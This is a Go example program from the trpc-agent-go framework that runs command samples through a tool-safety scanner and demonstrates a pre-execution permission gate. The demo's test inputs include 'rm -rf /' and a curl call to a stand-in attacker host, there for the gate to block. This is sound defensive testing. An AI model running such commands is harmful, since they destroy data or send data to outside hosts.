//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

// Command tool_safety_guard scans a set of command/script samples with the
// tool/safety engine and writes a structured report and a JSONL audit trail.
// With --demo it exercises the exact pre-execution permission gate the
// framework calls before running an exec tool.
package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"os"

	"trpc.group/trpc-go/trpc-agent-go/tool"
	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

type sample struct {
	Name           string             `json:"name"`
	Tool           string             `json:"tool"`
	Backend        safety.Backend     `json:"backend"`
	Command        string             `json:"command"`
	CodeBlocks     []safety.CodeBlock `json:"code_blocks"`
	ExpectDecision safety.Decision    `json:"expect_decision"`
	ExpectRule     string             `json:"expect_rule"`
}

func main() {
	policyPath := flag.String("policy", "tool_safety_policy.yaml", "policy file (.yaml/.json)")
	samplesPath := flag.String("samples", "samples.json", "samples file")
	reportPath := flag.String("report", "tool_safety_report.json", "structured report output")
	auditPath := flag.String("audit", "tool_safety_audit.jsonl", "JSONL audit output")
	demo := flag.Bool("demo", false, "run the pre-execution permission-gate demo")
	flag.Parse()

	policy := loadPolicy(*policyPath)
	scanner := safety.NewScanner(policy)

	if *demo {
		runDemo(scanner)
		return
	}

	samples, err := loadSamples(*samplesPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "load samples:", err)
		os.Exit(1)
	}

	auditFile, err := os.Create(*auditPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "create audit:", err)
		os.Exit(1)
	}
	defer func() {
		if cerr := auditFile.Close(); cerr != nil {
			fmt.Fprintln(os.Stderr, "close audit:", cerr)
		}
	}()
	// Deterministic committed output: omit timestamps.
	audit := safety.NewAuditWriter(auditFile, safety.WithoutTimestamp())

	reports := make([]safety.ScanReport, 0, len(samples))
	fmt.Printf("%-24s %-8s %-10s %s\n", "SAMPLE", "DECISION", "RISK", "RULE")
	fmt.Println("-------------------------------------------------------------------")
	for _, s := range samples {
		r := scanner.Scan(context.Background(), scanInput(s))
		reports = append(reports, r)
		if err := audit.Record(r); err != nil {
			fmt.Fprintln(os.Stderr, "audit record:", err)
		}
		fmt.Printf("%-24s %-8s %-10s %s\n", s.Name, r.Decision, r.RiskLevel, r.PrimaryRuleID())
	}

	if err := writeJSON(*reportPath, reports); err != nil {
		fmt.Fprintln(os.Stderr, "write report:", err)
		os.Exit(1)
	}
	fmt.Printf("\nWrote %d reports to %s and audit trail to %s\n", len(reports), *reportPath, *auditPath)
}

// runDemo mirrors what internal/flow/processor/functioncall.go does: it calls
// the safety PermissionPolicy before a tool would execute. A deny verdict here
// means the framework skips execution entirely.
func runDemo(scanner *safety.Scanner) {
	pol := safety.NewPermissionPolicy(scanner, safety.WithTelemetry(false))

	fmt.Println("Pre-execution permission gate demo")
	fmt.Println("In production, wire this as:")
	fmt.Println("  runner.Run(ctx, user, session, msg,")
	fmt.Println("      agent.WithToolPermissionPolicyFunc(pol.CheckToolPermission))")
	fmt.Println()

	for _, tc := range []struct {
		tool string
		args string
	}{
		{"exec_command", `{"command":"rm -rf /"}`},
		{"workspace_exec", `{"command":"curl http://evil.example.com/data"}`},
		{"workspace_exec", `{"command":"pip install requests"}`},
		{"workspace_exec", `{"command":"go test ./..."}`},
	} {
		req := &tool.PermissionRequest{ToolName: tc.tool, Arguments: []byte(tc.args)}
		d, _ := pol.CheckToolPermission(context.Background(), req)
		verdict := "EXECUTES"
		if d.Action != tool.PermissionActionAllow {
			verdict = "BLOCKED before execution"
		}
		fmt.Printf("[%s] %s\n    -> %s (%s) %s\n", tc.tool, tc.args, d.Action, verdict, d.Reason)
	}
}

func scanInput(s sample) safety.ScanInput {
	return safety.ScanInput{
		ToolName:   s.Tool,
		Backend:    s.Backend,
		Command:    s.Command,
		CodeBlocks: s.CodeBlocks,
	}
}

func loadPolicy(path string) *safety.Policy {
	// An explicit --policy that fails to load is fatal: silently falling back to
	// the built-in default would drop the operator's custom denied commands and
	// paths while appearing protected. DefaultPolicy is used only when no policy
	// path was requested.
	if path == "" {
		return safety.DefaultPolicy()
	}
	p, err := safety.LoadPolicy(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "load safety policy %q: %v\n", path, err)
		os.Exit(1)
	}
	return p
}

func loadSamples(path string) ([]sample, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var out []sample
	if err := json.Unmarshal(data, &out); err != nil {
		return nil, err
	}
	return out, nil
}

func writeJSON(path string, v any) error {
	blob, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, append(blob, '\n'), 0o600)
}
